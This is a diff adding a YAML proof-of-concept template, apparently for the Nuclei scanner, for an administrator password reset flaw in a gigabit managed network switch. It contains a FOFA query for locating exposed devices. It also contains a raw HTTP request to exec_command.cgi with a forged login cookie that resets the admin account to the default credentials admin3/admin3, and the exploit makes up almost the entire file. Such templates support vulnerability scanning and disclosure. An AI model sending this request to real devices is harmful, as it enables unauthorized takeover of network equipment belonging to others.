@@ -1,0 +1,40 @@
+id: poc-rkn2qsxovncpunqc
+info:
+  name: SW-5010&S3200-10T-2F全千兆网管型交换机存在管理员密码重置漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/rkn2qsxovncpunqc'
+  tags: other,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: rkn2qsxovncpunqc
+    fofa: 'body="#weicom" && body="border:1px solid #CCC"'
+http:
+- raw:
+  - 'GET /cgi-bin/exec_command.cgi?rand=0.6639611283476505&action=1&cgi_dest=username_admin3_password_encrypt_admin3&cli_node=11 HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36
+
+    Content-Type: application/x-www-form-urlencoded
+
+    Accept: */*
+
+    Accept-Encoding: gzip, deflate
+
+    Accept-Language: zh-CN,zh;q=0.9
+
+    Cookie: loginstatus=0login=1;
+
+    Connection: close
+
+
+    重置后默认密码
+
+    admin3/admin3'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
